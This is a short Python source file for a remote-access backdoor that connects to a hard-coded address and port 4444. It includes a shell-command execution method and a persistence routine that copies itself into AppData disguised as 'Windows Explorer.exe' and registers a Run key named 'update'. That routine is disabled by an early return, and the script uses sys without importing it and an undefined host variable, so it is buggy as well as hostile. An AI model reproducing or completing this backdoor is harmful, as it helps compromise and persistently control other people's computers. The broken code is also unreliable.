#!/usr/bin/env python

import socket
import os
import shutil
import subprocess

class Backdoor:
    def __init__(self, host, listener):

        self.connection = socket.socket(
            socket.AF_INET,     # IPv4
            socket.SOCK_STREAM, # TCP socket
        )
             
        self.connection.connect( (host, listener) )
    
    def run(self):
        while True:    
            try:
                with self.connection as s:
                    sys.stdout.write(f'\r[*] Connected to {host} ...')
                    s.sendall(b"Hi, this is a test server")

                    while True:
                        data = s.recv(1024)
                        if not data:
                            break
                        sys.stdout.write(f'\r\n[+] Received: {data}\n')
                        s.send(data)
            except Exception:
                sys.stdout.write('\x1b[2K')
                sys.stdout.write(f'\r[*] Waiting for connection ...')

    def become_persistent(self):

        return None

        location = os.environ["appdata"] + "\\Windows Explorer.exe"
        if not os.path.exists(location):
            shutil.copyfile(src = sys.executable, dst = location)
            subprocess.call(
                f'reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d {location}',
                shell = True,
            )

    def execute_command(self, command):
        return subprocess.check_output(command, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL, shell=True)


beautiful_door = Backdoor( '192.168.1.147', 4444 )
beautiful_door.run()


